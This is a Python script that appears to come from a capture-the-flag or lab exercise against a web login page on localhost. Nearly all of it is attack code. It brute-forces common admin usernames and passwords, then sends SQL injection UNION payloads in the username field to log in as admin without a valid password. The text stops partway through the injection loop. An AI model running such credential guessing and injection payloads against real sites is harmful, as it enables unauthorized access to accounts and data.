import requests

url = "http://127.0.0.1:32960/index.php"

print("=== Analysis: Authentication is happening, just not as admin ===")
print("The 'not the admin' message shows for ALL authenticated requests")
print("Need to find how to authenticate specifically as admin\n")

# Let's try different potential admin usernames
admin_variations = [
    'admin',
    'administrator',
    'root',
    'user',
    'test',
    'Admin',
    'ADMIN',
    'simpson',
    'simpsons',
    'homer',
    'bart',
]

print("Testing different usernames WITHOUT SQLi:")
for user in admin_variations:
    for pwd in ['admin', 'password', '123456', 'test', '']:
        resp = requests.get(url, params={'username': user, 'password': pwd})
        has_h3 = '<h3>' in resp.text
        is_not_admin = 'not the admin' in resp.text.lower() if has_h3 else False
        
        if has_h3 and not is_not_admin:
            print(f"  [!] SUCCESS with {user}:{pwd}")
            print(resp.text)
            break
    else:
        pass

print("\n=== Testing SQLi with ORDER BY to prioritize ===")

# If SQLi works, try to make the query return admin first
order_payloads = [
    # These should theoretically work if SQLi is possible
    ("%') UNION SELECT * FROM users WHERE username='admin' --", "any"),
    ("' UNION SELECT 1,'admin',3,4 --", "any"),  # Speculating column count
    ("' UNION SELECT 1 AS username, 2 AS password UNION SELECT * FROM users --", "any"),
]

for user, pwd in order_payloads:
    resp = requests.get(url, params={'username': user, 'password': pwd})
    has_h3 = '<h3>' in resp.text
    is_not_admin = 'not the admin' in resp.text.lower() if has_h3 else False
